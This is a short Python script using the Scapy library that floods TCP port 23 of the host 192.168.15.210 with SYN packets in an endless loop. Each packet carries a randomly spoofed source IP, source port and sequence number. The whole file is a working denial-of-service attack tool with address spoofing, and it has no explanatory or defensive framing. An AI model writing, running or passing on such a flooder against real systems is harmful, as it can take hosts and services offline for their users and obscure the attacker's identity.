from scapy.all import IP, TCP, send
from ipaddress import IPv4Address  # Corrected import
from random import getrandbits

ip = IP(dst="192.168.15.210")
tcp = TCP(dport=23, flags='S')  # setting two variables in the header
pkt = ip / tcp

while True:
    pkt[IP].src = str(IPv4Address(getrandbits(32)))  # generating a random source IP
    pkt[IP].sport = getrandbits(16)  # random source port
    pkt[TCP].seq = getrandbits(32)  # random sequence number
    send(pkt, verbose=0)
